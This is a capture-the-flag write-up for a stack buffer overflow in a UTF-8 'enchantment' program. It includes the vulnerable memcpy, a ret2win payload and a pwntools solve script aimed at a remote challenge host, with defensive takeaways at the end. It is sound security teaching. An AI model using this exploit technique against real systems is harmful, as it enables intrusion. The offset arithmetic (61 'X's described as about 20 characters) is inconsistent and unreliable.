# Enchantement Ritual - CTF Writeup

## Challenge Overview
This is a binary exploitation challenge involving a buffer overflow vulnerability in a text "enchantment" program that converts ASCII characters to multi-byte UTF-8 glyphs.

## Vulnerability Analysis


### The Vulnerable Code (vuln.c)

The program has an intentional buffer overflow in the `enchant_and_print()` function:

```c
char outbuf[100];  // Small 100-byte stack buffer
```

The vulnerability occurs at line where `memcpy` copies expanded data without bounds checking:

```c
memcpy(outbuf, expanded, needed);  // if needed > sizeof(outbuf) -> overflow
```

### How the Vulnerability Works

1. The program reads user input (up to 100 bytes)
2. Each character is "enchanted" by mapping it to multi-byte UTF-8 glyphs via `map_lookup()`
3. The expanded text is first safely built in a heap buffer
4. **The bug**: The entire expanded buffer is copied into a 100-byte stack buffer using `memcpy()` without checking if `needed > 100`

Since each lowercase/uppercase letter maps to a multi-byte UTF-8 sequence (typically 3 bytes each), an input of just 34+ characters will expand beyond 100 bytes and overflow the stack buffer.

### Binary Protections

The binary is compiled with minimal protections:
- `-fno-stack-protector` - No stack canaries
- `-no-pie` - No Position Independent Executable (fixed addresses)

This makes exploitation straightforward via return address overwrite.

### Win Function

The binary contains a `win()` function at address `0x000000000040152a` that reads and prints the flag:

```c
void win(void) {
    printf("||𝙹⚍ ᔑ∷ᒷ ᔑ ∴╎⨅ᔑ∷↸...\n");
    // Opens and reads flag.txt
}
```

## Exploitation Strategy

### Step 1: Calculate Offset

We need to determine how many bytes are required to reach the saved return address on the stack.

The character 'X' maps to "⨎" (3 bytes in UTF-8). By testing, we find that:
- 61 bytes of padding (using 'X' which expands to 3 bytes = ~20 characters)
- Plus 1 byte alignment ("4")
- Then 8 bytes for the return address (64-bit)

### Step 2: Craft the Payload

```python
payload = b'X'*61 + b"4" + p64(0x000000000040152a)
```

Breaking this down:
- `b'X'*61` - Padding to reach the return address
- `b"4"` - Single byte for alignment
- `p64(0x000000000040152a)` - Address of `win()` function in little-endian format

### Step 3: Execute the Exploit

The solve script (solve.py):

```python
from pwn import *

p = remote('34.51.233.21', 6020)
elf = ELF("./vuln")

payload = b'X'*61 + b"4" + p64(0x000000000040152a)

p.sendline(payload)
p.interactive()
```

## Exploitation Flow

1. Connect to the remote service
2. Send the crafted payload
3. The input gets "enchanted" and expanded
4. The `memcpy()` overflows `outbuf[100]`
5. The saved return address is overwritten with the address of `win()`
6. When `enchant_and_print()` returns, execution jumps to `win()`
7. The flag is printed

## Flag

The exploit successfully redirects execution to the `win()` function, which reads and displays the contents of `flag.txt`.

## Key Takeaways

- Buffer overflows can occur even when using "safe" functions like `memcpy()` if size checks are missing
- Multi-byte character encoding can amplify input size, making overflow calculations more complex
- Disabled security features (no PIE, no stack canaries) make exploitation trivial
- Always validate buffer sizes before copying data, especially when data expansion occurs
